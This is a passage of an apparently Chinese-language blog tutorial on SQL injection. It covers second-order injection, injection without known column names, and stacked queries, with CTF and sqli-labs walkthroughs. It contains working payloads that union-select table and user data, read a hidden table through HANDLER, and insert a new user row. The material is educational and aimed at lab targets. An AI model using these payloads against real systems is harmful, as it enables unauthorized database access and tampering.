<li>以<code>admin&#39;#</code>登录，执行<code>sql = &quot;SELECT * FROM users WHERE username=&#39;admin &#39;#&#39; and password=&#39;$password&#39;&quot;;</code>并可修改<code>admin</code>密码。</li>
</ol>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694950421_6506e415ac6b7d4482328.jpeg"
                      alt="图片.png"
                ></p>
<h2 id="无名列注入"><a href="#无名列注入" class="headerlink" title="无名列注入"></a>无名列注入</h2><ul>
<li>无名列注入就是在不知道列名的情况下进行 sql 注入。通常我们用于获取所有库的库名，表名，列名的 infomation_scema 库经常被 WAF 过滤。无名列注入适用于已经获取数据表但无法查询列的情况。</li>
<li>原理：类似于将我们不知道的列名进行取别名操作，在取别名的同时进行数据查询。<br>正常查询<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695194369_650a9d01e1b1809cd83e1.jpeg"
                      alt="图片.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695194467_650a9d636c71cc4a210d1.jpeg"
                      alt="图片.png"
                ><br>union 查询<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695194533_650a9da57fb6fe93ed0be.jpeg"
                      alt="图片.png"
                ><br>利用数字<strong>3</strong>代替未知列名需要加上反引号`3`。后面的<strong>a</strong>表示上图中表的别名。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695194729_650a9e695aa1c4a0aa786.jpeg"
                      alt="图片.png"
                ><br>若反引号被过滤掉，可用别名代替。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695194788_650a9ea40e73244560dcc.jpeg"
                      alt="图片.png"
                ></li>
</ul>
<p>BUU例题：[SWPU2019]Web1<br>注册后经测试，过滤了<code>or</code>,<code>#</code>,<code>--``+</code>和。<br>爆破库名：<br><code>1&#39;/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695195496_650aa168b53c1e2368e8a.jpeg"
                      alt="图片.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695195565_650aa1ad8375a774ee6b2.jpeg"
                      alt="图片.png"
                ><br>爆破表名：<br><code>1&#39;/**/union/**/select/**/1,database(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=&quot;web1&quot;&#39;</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695195692_650aa22c6adc022c33f16.jpeg"
                      alt="图片.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695195703_650aa2372de91d8573484.jpeg"
                      alt="图片.png"
                ><br>无名列注入：<br><code>1&#39;/**/union/**/select/**/1,database(),(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695195756_650aa26c9b351d824deca.jpeg"
                      alt="图片.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695195774_650aa27eb18737321a5e2.jpeg"
                      alt="图片.png"
                ></p>
<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><ul>
<li><p>堆叠注入就是一堆 SQL 语句一起执行。我们将多个 SQL 语句用 “;” 连接起来即可达到多条语句一起执行的效果。堆叠注入和 union 联合查询本质上都是将两条语句一起执行，但 union 查询只能连接两条查询语句，而堆叠注入可连接两条任意语句。当 WAF 没有过滤 show, rename, alert 等关键字时，可考虑堆叠注入。</p>
</li>
<li><p>例题：[强网杯 2019]随便注<br>输入<code>1&#39;;show databases;</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695196469_650aa53546795787c1a58.jpeg"
                      alt="图片.png"
                ><br>输入<code>1&#39;;show tables #</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695196646_650aa5e6393bc79d49753.jpeg"
                      alt="图片.png"
                ><br>输入</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; show columns from `words`#</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695197104_650aa7b0dad99a854f5e6.jpeg"
                      alt="图片.png"
                ><br>输入</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; show columns from `1919810931114514` #</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695196862_650aa6be9da5679bce968.jpeg"
                      alt="图片.png"
                ><br>输入</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; handler `1919810931114514` open as `a`; handler `a` read first limit 0,2;#</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695197353_650aa8a950d9623b3e907.jpeg"
                      alt="图片.png"
                ></p>
</li>
<li><p><a class="link"   href="https://blog.csdn.net/rainsghost/article/details/127246004" >Tips <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><code>hand tablename open as new_tablename;</code>。追加tablename的表的别名为new_tablename（需要注意的是，此处不是修改，且只在当前会话内生效）<br><code>Handler_read_next;</code>此选项表明在进行索引扫描时，按照索引从数据文件里取数据的次数。</p>
</li>
</ul>
<p>例题：sqli-labs:Less-38</p>
<p><strong><a class="link"   href="http://127.0.0.1/sqli-labs/Less-38/?id=1" >http://127.0.0.1/sqli-labs/Less-38/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></strong><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695197917_650aaadd41a5591833127.jpeg"
                      alt="图片.png"
                ><br>payload:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1/sqli-labs/Less-38/?id=1&#x27;;insert into users(id,username,password) values(21,&#x27;5555&#x27;,&#x27;5555&#x27;); #</span><br></pre></td></tr></table></figure></div>



<h2 id="SQL-注入与其他漏洞结合"><a href="#SQL-注入与其他漏洞结合" class="headerlink" title="SQL 注入与其他漏洞结合"></a>SQL 注入与其他漏洞结合</h2><p>后续补充。</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>SQL injection</tag>
      </tags>
  </entry>
</search>
